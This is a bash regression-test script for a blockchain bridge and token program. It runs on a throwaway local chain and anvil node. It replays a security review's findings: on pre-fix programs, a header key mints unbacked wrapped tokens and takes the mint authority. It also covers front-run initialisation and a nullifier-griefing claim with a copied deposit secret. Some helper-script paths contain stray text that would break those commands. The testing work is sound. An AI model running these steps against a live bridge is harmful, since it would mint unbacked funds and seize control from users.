#!/bin/bash
# SPDX-License-Identifier: MIT OR Apache-2.0
# The 2026-11-14 security review's attacks, on a THROWAWAY loopback LEZ rc3 chain and a local anvil
# (build host only; fresh keys only; nothing proved; never the public demo chain or Sepolia).
#
#   R=<new dir> SEQ_BIN=<rc3 sequencer_service> NETCFG=<rc3 networks/local.json>
#   OLD_CLI=<lez-bridge built before the fixes> OLD_ELF=<dir: bridge_guest.bin, token_guest.bin before the fixes>
#   CLI=<lez-bridge built from this branch (fixed guests embedded)> VAULT_DIR=<vault/ with lib/>
#   RPC=127.0.0.1:<port> METRICS=127.0.0.1:<port> RELAY_PORT=<port> ANVIL_PORT=<port>
#   e2e-security.sh [old|fixed|all]
#
# old    the programs BEFORE the fixes: does a program's loader header account sign an ordinary
#        public transaction (a native transfer), and does a token `Mint` / `SetAuthority` signed by
#        the bridge's header key mint the wrapped token / take its authority (review C1)?
# fixed  the FIXED programs: deploy, a stranger's `Initialize` and the retired `Init` refused on
#        chain, the header's `Initialize`, a second one refused, the header key's `Mint` and
#        `SetAuthority` refused, the sponsor cap, AttestRoot over anvil vault deposits, a public
#        relayed claim, the repeat refused, a burn; then the nullifier griefing: a second vault
#        deposit with the victim's secret for the attacker, claimed first, and the victim's claim
#        still applies (review H2).
# Negative cases are sent with the hidden `--allow-revert`, so they are included and revert ON
# CHAIN (the wallet would otherwise refuse them in simulation and send nothing).
set -uo pipefail
: "${R:?}" "${SEQ_BIN:?}" "${NETCFG:?}" "${RPC:?}" "${METRICS:?}"
for p in "$RPC" "$METRICS" "127.0.0.1:${RELAY_PORT:-0}" "127.0.0.1:${ANVIL_PORT:-0}"; do
  case "$p" in *:3062|*:3071|*:3230|*:3250|*:3290|*:3291|*:3295|*:3297|*:3340|*:3341|*:3860|*:8550) echo "refusing port $p"; exit 1 ;; esac
done
HERE=$(cd "$(dirname "$0")" && pwd)
ROOT_DIR=$(cd "$HERE/../.." && pwd)
export LEZ_BRIDGE_SEQUENCER=http://$RPC LEE_WALLET_PASSWORD=
mkdir -p "$R/run" "$R/wallets" "$R/logs"; chmod 700 "$R/wallets"
OUT=$R/run
say() { echo; echo "== $* $(date +%T)"; }
show() { grep -vE "^Transaction data" "$1" | cut -c1-240 | tail -"${2:-5}"; }
step() { local n=$1; shift; "$@" > "$OUT/$n.out" 2>&1; local rc=$?; echo "[$n] exit $rc"; show "$OUT/$n.out" "${SHOWN:-4}"; return $rc; }
FAILS=0
fail() { echo "  !! UNEXPECTED: $*"; FAILS=$((FAILS + 1)); }
# A step that must apply.
must() { local n=$1; shift; step "$n" "$@" || fail "$n did not apply"; }
# A negative step sent with --allow-revert: it must be INCLUDED and REVERT on chain; any other failure
# (encoding, wallet, admission) is counted as unexpected, not as a refusal.
reverts() { local n=$1; shift; "$@" > "$OUT/$n.out" 2>&1; local rc=$?
  if [ $rc = 0 ]; then echo "[$n] UNEXPECTED: applied"; show "$OUT/$n.out" 6; FAILS=$((FAILS + 1)); return 1; fi
  if grep -q "but reverted" "$OUT/$n.out"; then echo "[$n] refused on chain: $(grep -oE '[0-9a-f]{64} was included in block [0-9]+ but reverted' "$OUT/$n.out" | sed -n 1p | sed 's/^\(.\{8\}\)[0-9a-f]*/\1…/')"
  else echo "[$n] UNEXPECTED: failed before inclusion:"; show "$OUT/$n.out" 4; FAILS=$((FAILS + 1)); return 1; fi; }
# The same message without --allow-revert: the wallet's simulation refuses it; show the program's text
# and require it when given ($2).
simtext() { local n=$1 want=$2; shift 2; "$@" > "$OUT/$n.out" 2>&1 && { echo "[$n] UNEXPECTED: applied"; FAILS=$((FAILS + 1)); return 1; }
  if grep -qF "$want" "$OUT/$n.out"; then echo "[$n] simulation refused with the program's text: \"$want\""
  else echo "[$n] refused, text not found (\"$want\"):"; show "$OUT/$n.out" 3; FAILS=$((FAILS + 1)); fi; }
# A CLI-local refusal (nothing sent): must fail with this text.
clirefuses() { local n=$1 want=$2; shift 2; "$@" > "$OUT/$n.out" 2>&1 && { echo "[$n] UNEXPECTED: accepted"; FAILS=$((FAILS + 1)); return 1; }
  grep -qF "$want" "$OUT/$n.out" && echo "[$n] refused by the CLI: \"$want\"" || { echo "[$n] UNEXPECTED text:"; show "$OUT/$n.out" 3; FAILS=$((FAILS + 1)); }; }
supply_of() { "$@" 2>&1 | sed -n 's/^supply //p' | sed -n 1p; }
auth_of() { "$@" 2>&1 | sed -n 's/^authority //p' | sed -n 1p; }
rpc() { curl -s -m 10 -X POST "http://$RPC/" -H 'Content-Type: application/json' -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"$1\",\"params\":$2}"; }
idof() { grep -oE 'Public/[1-9A-HJ-NP-Za-km-z]{32,44}' | sed -n 1p | cut -d/ -f2; }
newacct() { "$@" wallet account new public > "$OUT/new.tmp" 2>&1; idof < "$OUT/new.tmp"; }
pkof() { sed -n 's/^With pk //p' "$OUT/new.tmp" | sed -n 1p; }
IDS=$OUT/ids.env; touch "$IDS"; . "$IDS"
save() { echo "$1=$2" >> "$IDS"; eval "$1=$2"; }
# borsh encodings of the raw messages (stdlib only)
enc() { /usr/bin/python3 -I "$HERE/e2e-security-enc.py" "$@"; }

# ---- chain (chain-rc3.sh: fresh operator wallet, genesis 10^14, loopback, gossip off)
if [ ! -d "$R/home" ]; then
  R=$R SEQ_BIN=$SEQ_BIN CLI=${CLI:-$OLD_CLI} NETCFG=$NETCFG RPC=$RPC METRICS=$METRICS "$ROOT_DIR/public-demo/rc3/chain-rc3.sh (not published)" setup || exit 1
fi
R=$R SEQ_BIN=$SEQ_BIN CLI=${CLI:-$OLD_CLI} NETCFG=$NETCFG RPC=$RPC METRICS=$METRICS "$ROOT_DIR/public-demo/rc3/chain-rc3.sh (not published)" start || exit 1
. "$R/operator.env"
OPW=$R/wallets/operator

old_phase() {
  : "${OLD_CLI:?}" "${OLD_ELF:?}" "${CLI:?}"
  local W=$R/wallets/old; mkdir -p "$W"; chmod 700 "$W"
  o()  { LEE_WALLET_HOME_DIR=$W "$OLD_CLI" "$@"; }
  on() { LEE_WALLET_HOME_DIR=$W "$CLI" "$@"; }     # the new CLI, for raw-call only (same wallet format)
  op() { LEE_WALLET_HOME_DIR=$OPW "$OLD_CLI" "$@"; }
  say "OLD programs (before the fixes): deploy with a fresh deployer"
  if [ -z "${O_D:-}" ]; then
    o wallet check-health >/dev/null 2>&1; save O_D "$(newacct o)"; DPK=$(pkof)
    step o-fund op wallet auth-transfer send --from Public/$OP --to-pk $DPK --amount 100000000000 || return 1
    step o-tok o deploy --which token --elf "$OLD_ELF/token_guest.bin" --payer $O_D || return 1
    save O_TIMG "$(sed -n 's/^image id //p' "$OUT/o-tok.out")"
    save O_TP "$(sed -n 's/^program //p' "$OUT/o-tok.out")"
    step o-br o deploy --which bridge --elf "$OLD_ELF/bridge_guest.bin" --payer $O_D || return 1
    save O_BP "$(sed -n 's/^program //p' "$OUT/o-br.out")"
    save O_BIMG "$(sed -n 's/^image id //p' "$OUT/o-br.out")"
    step o-wrap o create-wrapped --token-program $O_TP --bridge $O_BP --name "Wrapped (old, throwaway)" --payer $O_D || return 1
    save O_DEF "$(sed -n 's/^token //p' "$OUT/o-wrap.out")"
    Z=0x0000000000000000000000000000000000000000000000000000000000000000
    step o-init o init --bridge $O_BP --token-program $O_TP --admin $O_D --vault 0x8C8b2664De28e5287158db4DB65D448638871b74 \
      --chain-id 11155111 --lez-chain-id $Z --zone-id $Z --freezer $O_D --attestor $O_D || return 1
  fi
  o definition --token-program $O_TP --definition $O_DEF 2>&1 | grep -E '^(name|supply|authority)'
  say "C1-a: the bridge's header account $O_BP (key in the deployer's wallet) signs an ordinary public transaction"
  step o-fund-header o wallet auth-transfer send --from Public/$O_D --to Public/$O_BP --amount 50000000 || return 1
  step o-header-transfer o wallet auth-transfer send --from Public/$O_BP --to Public/$O_D --amount 1 || fail "the header could not sign"
  rpc getAccount "[\"$O_BP\"]" | /usr/bin/python3 -c 'import json,sys; r=json.load(sys.stdin)["result"]; print("header account nonce", r.get("nonce"))'
  say "C1-b: the header key signs token Mint (as the authority id) to itself"
  s0=$(supply_of o definition --token-program $O_TP --definition $O_DEF)
  step o-header-mint on raw-call --program $O_TP --signer $O_BP --message-hex "$(enc mint $O_DEF $O_BP 1000000000000)" \
    --also "$O_DEF@$O_TP" --payer $O_D
  s1=$(supply_of o definition --token-program $O_TP --definition $O_DEF)
  echo "wrapped supply before $s0, after $s1"
  [ "$s1" = "$((s0 + 1000000000000))" ] && echo "C1 EXPLOIT CONFIRMED ON CHAIN: the header key minted 1000000000000 unbacked" || fail "the old token did not mint (supply $s0 -> $s1)"
  LEE_WALLET_HOME_DIR=$W "$OLD_CLI" balances --token-program $O_TP 2>&1 | grep -v '^Transaction' | sed -n 1,5p
  say "C1-c: the header key signs token SetAuthority (old encoding) to the deployer's account"
  step o-header-setauth on raw-call --program $O_TP --signer $O_BP --message-hex "$(enc setauth-old $O_DEF $O_D)" \
    --also "$O_DEF@$O_TP" --payer $O_D
  a1=$(auth_of o definition --token-program $O_TP --definition $O_DEF)
  echo "authority now $a1"
  [ "$a1" = "Some($O_D)" ] && echo "C1 TAKEOVER CONFIRMED ON CHAIN: the header key moved the mint authority to $O_D" || fail "authority not moved ($a1)"
}

fixed_phase() {
  : "${CLI:?}" "${VAULT_DIR:?}" "${ANVIL_PORT:?}" "${RELAY_PORT:?}"
  local W=$R/wallets/fixed U=$R/wallets/user S=$R/wallets/stranger
  for w in "$W" "$U" "$S" "$R/wallets/relay"; do mkdir -p "$w"; chmod 700 "$w"; done
  d()  { LEE_WALLET_HOME_DIR=$W "$CLI" "$@"; }
  u()  { LEE_WALLET_HOME_DIR=$U "$CLI" "$@"; }
  st() { LEE_WALLET_HOME_DIR=$S "$CLI" "$@"; }
  op() { LEE_WALLET_HOME_DIR=$OPW "$CLI" "$@"; }
  ETH_RPC=http://127.0.0.1:$ANVIL_PORT
  ANVIL_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80   # anvil's public test key 0
  say "FIXED programs: deployer, stranger, claimers V (victim) and A (attacker), relay payer"
  if [ -z "${F_D:-}" ]; then
    d wallet check-health >/dev/null 2>&1; save F_D "$(newacct d)"; DPK=$(pkof)
    step f-fund op wallet auth-transfer send --from Public/$OP --to-pk $DPK --amount 100000000000 || return 1
    st wallet check-health >/dev/null 2>&1; save F_S "$(newacct st)"; SPK=$(pkof)
    step s-fund op wallet auth-transfer send --from Public/$OP --to-pk $SPK --amount 1000000000 || return 1
    u wallet check-health >/dev/null 2>&1; save F_V "$(newacct u)"; VPK=$(pkof); save F_A "$(newacct u)"; APK=$(pkof)
    step a-fund op wallet auth-transfer send --from Public/$OP --to-pk $APK --amount 1000000000 || return 1
    step v-fund op wallet auth-transfer send --from Public/$OP --to-pk $VPK --amount 1000000000 || return 1
  fi
  if [ -z "${F_BP:-}" ]; then
    step f-tok d deploy --which token --payer $F_D || return 1
    save F_TP "$(sed -n 's/^program //p' "$OUT/f-tok.out")"
    save F_TIMG "$(sed -n 's/^image id //p' "$OUT/f-tok.out")"
    step f-br d deploy --which bridge --payer $F_D || return 1
    save F_BP "$(sed -n 's/^program //p' "$OUT/f-br.out")"
    save F_BIMG "$(sed -n 's/^image id //p' "$OUT/f-br.out")"
    step f-wrap d create-wrapped --token-program $F_TP --bridge $F_BP --name "Wrapped USDC (fixed, throwaway)" --payer $F_D || return 1
    save F_DEF "$(sed -n 's/^token //p' "$OUT/f-wrap.out")"
  fi
  echo "image ids: bridge $F_BIMG, token $F_TIMG (old: bridge ${O_BIMG:-?}, token ${O_TIMG:-?})"
  { [ -n "$F_BIMG" ] && [ -n "${O_BIMG:-}" ] && [ -n "${O_TIMG:-}" ] && [ "$F_BIMG" != "$O_BIMG" ] && [ "$F_TIMG" != "$O_TIMG" ]; } \
    || fail "image ids not shown to differ from the old programs' (run the old phase first, on a fresh R)"
  d definition --token-program $F_TP --definition $F_DEF 2>&1 | grep -E '^(name|supply|authority)'
  save F_CHAIN "$(d chain-id | sed -n 's/^LEZ_CHAIN_ID=//p')"
  save F_ZONE "$("$CLI" source-id | sed -n 's/^ZONE_ID=//p')"
  echo "chain channel id $F_CHAIN; stand-in source id (zoneId) $F_ZONE"
  CONFIG_PDA=$("$CLI" program-id --bridge $F_BP | sed -n 's/^CONFIG=//p')

  say "Ethereum: anvil + the vault for bridge $F_BP (lezChainId = channel id, zoneId = source id)"
  if ! cast chain-id --rpc-url $ETH_RPC >/dev/null 2>&1; then
    nohup anvil --port $ANVIL_PORT --silent > "$R/logs/anvil.log" 2>&1 & echo $! > "$R/anvil.pid"; sleep 2
  fi
  if [ -z "${F_VAULT:-}" ]; then
    PROGRAM_ID=$("$CLI" program-id --bridge $F_BP | sed -n 's/^PROGRAM_ID=//p')
    out=$(cd "$VAULT_DIR" && LEZ_CHAIN_ID=$F_CHAIN ZONE_ID=$F_ZONE PROGRAM_ID=$PROGRAM_ID \
      forge script script/LocalDeploy.s.sol --rpc-url $ETH_RPC --private-key $ANVIL_KEY --broadcast 2>&1) || { echo "$out" | tail -20; return 1; }
    save F_VAULT "$(echo "$out" | sed -n 's/.*VAULT=\(0x[0-9a-fA-F]*\).*/\1/p' | sed -n 1p)"
    save F_USDC "$(echo "$out" | sed -n 's/.*USDC=\(0x[0-9a-fA-F]*\).*/\1/p' | sed -n 1p)"
    save F_CFG "$(echo "$out" | sed -n 's/.*CFG_ID=\(0x[0-9a-fA-F]*\).*/\1/p' | sed -n 1p)"
  fi
  EVM=$(cast chain-id --rpc-url $ETH_RPC)
  echo "vault $F_VAULT usdc $F_USDC cfg $F_CFG (evm chain $EVM)"

  say "H1: a stranger sends Initialize (its own admin) before the deployer: refused on chain"
  reverts h1-stranger st --allow-revert raw-call --program $F_BP --signer $F_S \
    --message-hex "$(enc initialize $F_S $F_VAULT $EVM $F_CHAIN $F_TP $F_S $F_S)" --also "$CONFIG_PDA@$F_BP" --payer $F_S
  say "H1: the retired Init, even signed by the header key: refused on chain"
  reverts h1-legacy d --allow-revert raw-call --program $F_BP --signer $F_BP \
    --message-hex "$(enc init-legacy $F_VAULT $EVM $F_CHAIN $F_ZONE $F_TP $F_D $F_D)" --also "$CONFIG_PDA@$F_BP" --payer $F_D
  say "H1: the same messages without --allow-revert: the simulation refuses them with the program's texts"
  simtext h1-stranger-sim "only this program's header account initialises the bridge" st raw-call --program $F_BP --signer $F_S \
    --message-hex "$(enc initialize $F_S $F_VAULT $EVM $F_CHAIN $F_TP $F_S $F_S)" --also "$CONFIG_PDA@$F_BP" --payer $F_S
  simtext h1-legacy-sim "Init is retired" d raw-call --program $F_BP --signer $F_BP \
    --message-hex "$(enc init-legacy $F_VAULT $EVM $F_CHAIN $F_ZONE $F_TP $F_D $F_D)" --also "$CONFIG_PDA@$F_BP" --payer $F_D
  say "H1: the CLI refuses an init without the header key (stranger's wallet), and a wrong chain id"
  clirefuses h1-cli-stranger "is not a public account of this wallet" st init --bridge $F_BP --token-program $F_TP --admin $F_S --vault $F_VAULT --chain-id $EVM \
    --freezer $F_S --attestor $F_S --payer $F_S
  clirefuses h1-cli-chain "is not this chain's channel id" d init --bridge $F_BP --token-program $F_TP --admin $F_D --vault $F_VAULT --chain-id $EVM \
    --lez-chain-id 0x$(printf '11%.0s' $(seq 32)) --freezer $F_D --attestor $F_D --payer $F_D
  if ! d show --bridge $F_BP > "$OUT/show0.out" 2>&1; then
    say "H1: the deployer's header key initialises through the raw Initialize encoding (positive control of the"
    say "    encoding the negative steps use); admin, freezer, attestor = the deployer's fee account"
    step f-init d raw-call --program $F_BP --signer $F_BP \
      --message-hex "$(enc initialize $F_D $F_VAULT $EVM $F_CHAIN $F_TP $F_D $F_D)" --also "$CONFIG_PDA@$F_BP" --payer $F_D || return 1
  fi
  d show --bridge $F_BP > "$OUT/show.out" 2>&1; grep -E '^(cfg_id|admin|freezer|attestor|lez_chain_id|zone_id)' "$OUT/show.out" | sed -n 1,8p
  ONCHAIN=$(sed -n 's/^cfg_id //p' "$OUT/show.out" | tr 'A-F' 'a-f')
  [ "$ONCHAIN" = "$(echo $F_CFG | tr 'A-F' 'a-f')" ] && echo "bridge cfg_id = vault cfgId" || { echo "CFG MISMATCH bridge $ONCHAIN vault $F_CFG"; FAILS=$((FAILS + 1)); }
  say "H1: a second Initialize by the header key: refused on chain"
  reverts h1-again d --allow-revert raw-call --program $F_BP --signer $F_BP \
    --message-hex "$(enc initialize $F_D $F_VAULT $EVM $F_CHAIN $F_TP $F_D $F_D)" --also "$CONFIG_PDA@$F_BP" --payer $F_D
  if [ -z "${F_REG:-}" ]; then
    step f-reg d register --bridge $F_BP --admin $F_D --eth-token $F_USDC --definition $F_DEF --decimals 6 --denoms 100000000,1000000000 || return 1
    save F_REG 1
  fi
  say "M2: sponsor above the program's cap: refused on chain; at the cap: applied"
  reverts m2-over d --allow-revert set-sponsor --bridge $F_BP --admin $F_D --amount 50000001
  step m2-cap d set-sponsor --bridge $F_BP --admin $F_D --amount 50000000

  say "C1: the FIXED bridge's header key signs token Mint and SetAuthority: refused on chain"
  step f-fund-header d wallet auth-transfer send --from Public/$F_D --to Public/$F_BP --amount 50000000
  reverts c1-mint d --allow-revert raw-call --program $F_TP --signer $F_BP --message-hex "$(enc mint $F_DEF $F_BP 1000000000000)" \
    --also "$F_DEF@$F_TP" --payer $F_D
  reverts c1-setauth d --allow-revert raw-call --program $F_TP --signer $F_BP --message-hex "$(enc setauth-account $F_DEF $F_D)" \
    --also "$F_DEF@$F_TP" --payer $F_D
  reverts c1-renounce d --allow-revert raw-call --program $F_TP --signer $F_BP --message-hex "$(enc setauth-none $F_DEF)" \
    --also "$F_DEF@$F_TP" --payer $F_D
  d definition --token-program $F_TP --definition $F_DEF 2>&1 | grep -E '^(supply|authority)'
  [ "$(supply_of d definition --token-program $F_TP --definition $F_DEF)" = 0 ] || fail "the wrapped supply moved"
  say "positive control of the token encodings: an ACCOUNT-authority definition (authority = the deployer)"
  if [ -z "${F_ADEF:-}" ]; then save F_ADEF "$(newacct d)"; fi
  must p-newdef d raw-call --program $F_TP --signer $F_ADEF --message-hex "$(enc newdef-account "Account-minted (control)" $F_D $F_D)" --payer $F_D
  must p-mint d raw-call --program $F_TP --signer $F_D --message-hex "$(enc mint-account $F_ADEF $F_D 5)" --also "$F_ADEF@$F_TP" --payer $F_D
  must p-setauth d raw-call --program $F_TP --signer $F_D --message-hex "$(enc setauth-account $F_ADEF $F_S)" --also "$F_ADEF@$F_TP" --payer $F_D
  echo "control definition: supply $(supply_of d definition --token-program $F_TP --definition $F_ADEF), authority $(auth_of d definition --token-program $F_TP --definition $F_ADEF)"
  clirefuses p-register "not the bridge program" d register --bridge $F_BP --admin $F_D --eth-token 0x00000000000000000000000000000000000000aa \
    --definition $F_ADEF --decimals 6 --denoms 100

  say "Ethereum: V deposits 1000 USDC (secret k); A copies k and deposits the minimum, 100, for A"
  if [ ! -f "$OUT/k.env" ]; then ( umask 077; echo "K=0x$(openssl rand -hex 32)" > "$OUT/k.env" ); fi
  . "$OUT/k.env"
  if [ -z "${F_DEP:-}" ]; then
    CV=$("$CLI" commitment --secret $K --dest $F_V --eth-token $F_USDC --denom 1000000000 --cfg-id $F_CFG | grep -oE '0x[0-9a-f]{64}' | sed -n 1p)
    CA=$("$CLI" commitment --secret $K --dest $F_A --eth-token $F_USDC --denom 100000000 --cfg-id $F_CFG | grep -oE '0x[0-9a-f]{64}' | sed -n 1p)
    cast send $F_VAULT "deposit(address,uint32,bytes32)" $F_USDC 1 $CV --private-key $ANVIL_KEY --rpc-url $ETH_RPC >/dev/null || return 1
    cast send $F_VAULT "deposit(address,uint32,bytes32)" $F_USDC 0 $CA --private-key $ANVIL_KEY --rpc-url $ETH_RPC >/dev/null || return 1
    save F_DEP 1
  fi
  cast logs --from-block 0 --address $F_VAULT "Deposit(address indexed,uint32,bytes32,uint64,bytes32)" --rpc-url $ETH_RPC --json \
    | /usr/bin/python3 -c '
import json,sys
for l in json.load(sys.stdin):
    d=l["data"][2:]; print(l["topics"][1][-40:], int(d[0:64],16), "0x"+d[64:128])' > "$OUT/deposits.txt"
  : > "$OUT/leaves.txt"
  while read -r tok di c; do
    den=$([ "$di" = 0 ] && echo 100000000 || echo 1000000000)
    cast call $F_VAULT "depositLeaf(address,uint256,bytes32)(bytes32)" 0x$tok $den $c --rpc-url $ETH_RPC >> "$OUT/leaves.txt"
  done < "$OUT/deposits.txt"
  ROOT=$(cast call $F_VAULT "depositRoot()(bytes32)" --rpc-url $ETH_RPC)
  echo "$(wc -l < "$OUT/leaves.txt") vault leaves, root $ROOT"
  step f-attest d attest --bridge $F_BP --attestor $F_D --root $ROOT

  claim() { local who=$1 i=$2 di=$3 den=$4; shift 4
    u claim --bridge $F_BP --token-program $F_TP --from $who --eth-token $F_USDC --denom-index $di --denom $den \
      --secret $K --cfg-id $F_CFG --leaves "$OUT/leaves.txt" --index $i "$@"; }
  say "H2: A claims A's own deposit (leaf 1) first, with V's secret"
  must h2-attacker claim $F_A 1 0 100000000
  say "H2: V claims V's deposit (leaf 0) afterwards: must apply (before the fix: claim refused for good)"
  must h2-victim claim $F_V 0 1 1000000000
  u balances --token-program $F_TP 2>&1 | grep -v '^Transaction' | sed -n 1,6p
  say "repeat claims refused (CLI pre-check, then on chain with --no-precheck --allow-revert)"
  clirefuses h2-repeat "already claimed" claim $F_V 0 1 1000000000
  reverts h2-repeat-chain u --allow-revert claim --bridge $F_BP --token-program $F_TP --from $F_V --eth-token $F_USDC --denom-index 1 \
    --denom 1000000000 --secret $K --cfg-id $F_CFG --leaves "$OUT/leaves.txt" --index 0 --no-precheck

  say "relayed public claim of a third deposit into a never-used account X (claim --relay)"
  [ -f "$HERE/../../public-demo/relayer/relayer.py" ] && FIXED_RELAY=1
  relay_claim || FAILS=$((FAILS + 1))

  say "burn 100 for exit (A)"
  must f-burn u burn --bridge $F_BP --token-program $F_TP --from $F_A --definition $F_DEF --amount 100000000 \
    --exit 0x$(openssl rand -hex 32)
  d show --bridge $F_BP 2>&1 | grep -iE 'claims|burns|claimed|burned' | sed -n 1,6p
}

# The relayed claim: overridden by e2e-security-relay.sh when present (the relay's own setup).
relay_claim() { [ -f "$HERE/e2e-security-relay.sh" ] && . "$HERE/e2e-security-relay.sh"; }

case "${1:-all}" in
  old) old_phase ;;
  fixed) fixed_phase ;;
  all) old_phase; fixed_phase ;;
  *) echo "usage: $0 old|fixed|all"; exit 2 ;;
esac
say "done: $FAILS unexpected result(s). Stop: kill \$(cat $R/anvil.pid) (if any); R=$R RPC=$RPC METRICS=$METRICS $ROOT_DIR/public-demo/rc3/chain-rc3.sh (not published) stop; delete $R"
exit $FAILS
